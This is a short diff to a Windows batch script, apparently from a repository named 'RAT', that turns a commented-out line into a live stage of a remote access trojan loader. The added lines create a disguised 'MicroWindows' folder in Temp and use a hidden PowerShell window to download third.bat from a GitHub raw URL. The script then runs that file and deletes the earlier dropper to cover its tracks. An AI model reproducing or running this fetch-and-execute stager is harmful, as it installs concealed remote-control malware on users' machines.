@@ -1,8 +1,11 @@
+set "currentd=%cd%"
+set "username=saifa"
+
 mkdir C:\Users\%username%\AppData\Local\Temp\MicroWindows
-@rem powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o C:/Users/%username%/AppData/Local/Temp/MicroWindows/secondary.bat
+powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/third.bat -o C:/Users/%username%/AppData/Local/Temp/MicroWindows/third.bat
 timeout 5
 
 cd C:\Users\%username%\AppData\Local\Temp\MicroWindows
-hello.bat
+third.bat
 cd %currentd%
-del Starter.bat
+del secondary.bat
